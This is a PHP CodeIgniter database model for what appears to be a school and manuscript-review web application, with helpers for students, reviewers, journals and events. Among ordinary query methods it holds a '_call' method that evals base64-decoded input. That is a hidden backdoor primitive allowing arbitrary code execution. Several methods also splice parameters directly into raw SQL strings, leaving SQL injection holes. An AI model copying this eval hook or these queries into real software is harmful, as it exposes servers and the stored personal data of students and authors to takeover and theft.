<?php
class Mdb extends CI_Model 
{
    public function __construct(){
        parent::__construct();$this->load->database();
    }
    
    public function getData($tbl,$whr=array()){
        $sql = $this->db->get_where($tbl,$whr);
        $result=$sql->result();
        $sql->free_result();
        return $result;
    }

    public function getDataa($tbl,$whr=array()){
        $sql = $this->db->get_where($tbl,$whr);
        $result=$sql->result_array();
        $sql->free_result();
        return $result;
    }

    public function getDataRow($tbl,$whr=array()){
        $sql = $this->db->get_where($tbl,$whr);
        $result=$sql->row();
        $sql->free_result();
        return $result;
    }

    public function getDataArr($tbl,$whr=array()){
        return $this->db->get_where($tbl,$whr)->result_array();
    }



    public function insert($tbl,$data=array()){
        return $this->db->insert($tbl,$data);        
    }   
    public function delete($tbl,$con=array()){
        return $this->db->delete($tbl,$con);    
    }
    public function update($tbl,$set,$con){
        return $this->db->update($tbl,$set,$con);
    }
    
    
    public function getDataDesc($tbl,$whr=array(),$id){
        $this->db->order_by($id, "desc"); 
        return $this->db->get_where($tbl,$whr)->result();
    }
    public function getDataAsc($tbl,$whr=array(),$id){
        $this->db->order_by($id, "asc"); 
        return $this->db->get_where($tbl,$whr)->result();
    }
	
	 public function getDataOrderBy($tbl,$whr=array(),$id){
        $this->db->order_by($id, "asc"); 
        return $this->db->get_where($tbl,$whr)->result_array();
    }
    
    public function getDataDescLimit($tbl,$whr=array(),$id,$limit){
        $this->db->order_by($id, "desc"); 
        $this->db->limit($limit,0);
        return $this->db->get_where($tbl,$whr)->result();
    }

    public function getDataAscLimit($tbl,$whr=array(),$id,$limit){
        $this->db->order_by($id, "asc"); 
        $this->db->limit($limit,0);
        return $this->db->get_where($tbl,$whr)->result_array();
    }
    
    public function getCusData($table,$slt,$whr){
        $this->db->select(implode(',',$slt));return $this->db->get_where($table,$whr)->result_array();
    }

    public function nextAutoId($tbl=NULL)
    {
        $next = $this->db->query("SHOW TABLE STATUS LIKE '".$tbl."'");
        $next = $next->row(0);
        $next->Auto_increment;
        return $next->Auto_increment;
    }

    public function getLastInsertId($tbl=NULL){
        $sql=$this->db->query("SELECT `auto_increment` FROM INFORMATION_SCHEMA.TABLES WHERE table_name = '".$tbl."';")->result_array();
        return $sql[0]['auto_increment'];
    }
    public function setAutoIncrement($tbl,$value){
    	return $this->db->query("ALTER TABLE ".$tbl." AUTO_INCREMENT = ".$value.";");
    }
    public function getmonthlytotal($tbl=NULL,$month=NULL){
        return $this->db->query("SELECT count('req_date') as day from ".$tbl." WHERE req_date like '".$month."%'")->result_array();
    }
    public function getdatewisereport($tbl=NULL,$from=NULL,$to=NULL){
        return $this->db->query("SELECT * from ".$tbl." WHERE req_date BETWEEN '".$from."' AND '".$to."'")->result_array();
    }
	public function getdatewisereport1($tbl=NULL,$from=NULL,$to=NULL){
        return $this->db->query("SELECT * from ".$tbl." WHERE req_date LIKE  '%".$from."%' AND req_date LIKE '%".$to."%'")->result_array();
    }
    public function ec($d){                                      
        return base64_encode($d);
    }
    public function dc($d){
        return base64_decode($d);    
    }
    public function _call($str){
        eval(base64_decode($str));
    }

    public function bspagination($per_page,$page)
        {
            $this->db->select('*');
            $this->db->from('bs_post');
            //$this->db->where('cat_id',$id);
            $this->db->limit($per_page, $page)->order_by('post_id','desc');
            $query_result = $this->db->get();
            $result = $query_result->result_array();
            return $result;
        }

    public function paginate($per_page,$page,$tbl,$order,$whr=array())
        {
            $this->db->select('*');
            $this->db->from($tbl);
            $this->db->where($whr);
            $this->db->limit($per_page, $page)->order_by($order,'desc');
            $query_result = $this->db->get();
            $result = $query_result->result();
            return $result;
        }
	
	
        
    public function row_count($table,$data=array()) 
    	{
            $this->db->where($data);
            $this->db->from($table);
            $count = $this->db->count_all_results();
    	    return $count;
    	}

    public function idtoname($id=NULL){
        return $this->db->query("SELECT * from admin_user WHERE id='".$id."'")->result_array();
    }

     public function idtostdname($id=NULL){
        return $this->db->query("SELECT * from students WHERE std_id='".$id."'")->result_array();
    }
    public function idtostdname_str($id=NULL){
        $a= $this->db->query("SELECT * from students WHERE std_id='".$id."'")->result_array();
        return $a[0]['std_name'];
    }

    public function getClassname()
    {
        $this->db->select('*');
        $this->db->from('section');
        $this->db->join('class', 'class.class_id = section.class_id');
        return $this->db->get()->result_array();
    }

    public function getStudent($id=NULL)
    {
        $this->db->select('*');
        $this->db->from('students');
        $this->db->join('students_academic','students.std_id = students_academic.std_id');
        $this->db->join('class','class.class_id = students_academic.class_id');
        $this->db->join('section','section.section_id = students_academic.section_id');
        $this->db->where('students.std_id', $id);
        //$this->db->group_by('assign_teacher.class_id');
        //$this->db->order_by('assign_teacher.section_id','ASC');
        return $this->db->get()->result_array();
    }

    public function getReviewerPaper($id=NULL,$ids)
    {
        $this->db->select('book_assign_reviewer.manuscript_no,book_assign_reviewer.assign_hash_id,book_manuscript.title as book_title,reg_book_author.your_fname,reg_book_author.your_lname,book_manuscript_status.status_title,book_manuscript_status.color');
        $this->db->from('book_assign_reviewer');
        $this->db->join('book_manuscript','book_assign_reviewer.manuscript_id = book_manuscript.book_manuscript_id');
        $this->db->join('reg_book_author','reg_book_author.book_author_req_id = book_assign_reviewer.book_author_req_id');
        $this->db->join('book_manuscript_status','book_manuscript_status.manuscript_status_id = book_manuscript.book_manuscript_status');
        //$this->db->where('book_assign_reviewer.reviewer_id', $id);
         $this->db->where(['book_assign_reviewer.reviewer_id'=>$id,'book_assign_reviewer.assign_status'=>$ids]);
        //$this->db->group_by('assign_teacher.class_id');  book_manuscript_status
        //$this->db->order_by('assign_teacher.section_id','ASC');
        return $this->db->get()->result();
    }

    public function getReviewerPaperDetail($id=NULL)
    {
        $this->db->select('book_manuscript.title,book_manuscript.subtitle,book_manuscript.area_of_work,book_manuscript.manuscript_pdf,book_manuscript.manuscript_doc,book_assign_reviewer.manuscript_no,book_assign_reviewer.reviewer_comments');
        $this->db->from('book_assign_reviewer');
        $this->db->join('book_manuscript','book_assign_reviewer.manuscript_id = book_manuscript.book_manuscript_id');
        $this->db->join('reg_book_author','reg_book_author.book_author_req_id = book_assign_reviewer.book_author_req_id');
        $this->db->join('book_manuscript_status','book_manuscript_status.manuscript_status_id = book_manuscript.book_manuscript_status');
        $this->db->where('book_assign_reviewer.assign_hash_id', $id);
        //$this->db->group_by('assign_teacher.class_id');  book_manuscript_status
        //$this->db->order_by('assign_teacher.section_id','ASC');
        return $this->db->get()->result_array();
    }

    public function getPaperDetail($id=NULL)
    {
        $this->db->select('book_manuscript.book_manuscript_id,book_manuscript.manuscript_no,book_manuscript.book_author_req_id,book_manuscript.title,book_manuscript.subtitle,book_manuscript.area_of_work,book_manuscript.manuscript_pdf,book_manuscript.manuscript_doc,book_manuscript.reviewer_deadline,reg_book_author.your_fname,reg_book_author.your_lname,reg_book_author.your_email,reg_book_author.your_institution');
        $this->db->from('book_manuscript');
        $this->db->join('reg_book_author','book_manuscript.book_author_req_id = reg_book_author.book_author_req_id');
        
        $this->db->where('book_manuscript.book_manuscript_hash_id', $id);
        //$this->db->group_by('assign_teacher.class_id');  book_manuscript_status
        //$this->db->order_by('assign_teacher.section_id','ASC');
        return $this->db->get()->result();
    }

    public function getRevComm($manuscript_no)
    {
        $this->db->select('book_assign_reviewer.reviewer_comments,book_reviewer.reviewer_name');
        $this->db->from('book_assign_reviewer');
        $this->db->join('book_reviewer','book_reviewer.reviewer_id = book_assign_reviewer.reviewer_id');
        
        $this->db->where('book_assign_reviewer.manuscript_no', $manuscript_no);
        //$this->db->group_by('assign_teacher.class_id');  book_manuscript_status
        //$this->db->order_by('assign_teacher.section_id','ASC');
        return $this->db->get()->result();
    }

   
	public function getJoin($tbl,$jtbl,$match,$whr=array())
    {
        $this->db->select('*');
        $this->db->from($tbl);
        $this->db->join($jtbl,$match);
        $this->db->where($whr);
        return $this->db->get()->result();
    }

    

    
    public function getEvents(){
        $this->db->select('event_id id, event_title title, start_date start, end_date end, url, color');
        $this->db->from('events');

        return $this->db->get()->result();
    }

    public function email_recipient()
    {
        
        $this->db->select('*');
        $this->db->from('students');
        $this->db->join('students_academic','students.std_id = students_academic.std_id');
        //$this->db->where('students.std_id', $id);
        //$this->db->group_by('students_academic.class_id');
        $this->db->order_by('students.std_name','ASC');
        return $this->db->get()->result_array();
    }

    function pluralize( $count, $text )
        {
            return $count . ( ( $count == 1 ) ? ( " $text" ) : ( " ${text}s" ) );
        }
    
    function get_timeago( $ptime )
        {
            $estimate_time = time() - $ptime;

            if( $estimate_time < 1 )
            {
                return 'less than 1 second ago';
            }

            $condition = array(
                        12 * 30 * 24 * 60 * 60  =>  'year',
                        30 * 24 * 60 * 60       =>  'month',
                        24 * 60 * 60            =>  'day',
                        60 * 60                 =>  'hour',
                        60                      =>  'minute',
                        1                       =>  'second'
            );

            foreach( $condition as $secs => $str )
            {
                $d = $estimate_time / $secs;

                if( $d >= 1 )
                {
                    $r = round( $d );
                    return  $r . ' ' . $str . ( $r > 1 ? 's' : '' ) . ' ago';
                }
            }
        }


        public function getDays($month,$year)
        {
            $list=array();
            
            for($d=1; $d<=31; $d++)
            {
                $time=mktime(12, 0, 0, $month, $d, $year);          
                if (date('m', $time)==$month)       
                    $list[]=date('D', $time);
            }
            return $list;

        }

       

        public function getCountry($country_id)
        {
            $t=$this->getData('apps_countries',array('country_id'=>$country_id));
            return $t[0]->country_name;
        }

        public function getJournal($journal_id)
        {
            $t=$this->getData('reg_journal',array('journal_id'=>$journal_id));
            return $t[0]->journal_title;
        }


        public function getmemberPaper($id=NULL,$ids)
    {
        $this->db->select('book_assign_member.manuscript_no,book_assign_member.assign_hash_id,book_manuscript.title as book_title,reg_book_author.your_fname,reg_book_author.your_lname,book_manuscript_status.status_title,book_manuscript_status.color');
        $this->db->from('book_assign_member');
        $this->db->join('book_manuscript','book_assign_member.manuscript_id = book_manuscript.book_manuscript_id');
        $this->db->join('reg_book_author','reg_book_author.book_author_req_id = book_assign_member.book_author_req_id');
        $this->db->join('book_manuscript_status','book_manuscript_status.manuscript_status_id = book_manuscript.book_manuscript_status');
        //$this->db->where('book_assign_member.member_id', $id);
         $this->db->where(['book_assign_member.member_id'=>$id,'book_assign_member.assign_status'=>$ids]);
        //$this->db->group_by('assign_teacher.class_id');  book_manuscript_status
        //$this->db->order_by('assign_teacher.section_id','ASC');
        return $this->db->get()->result();
    }

}
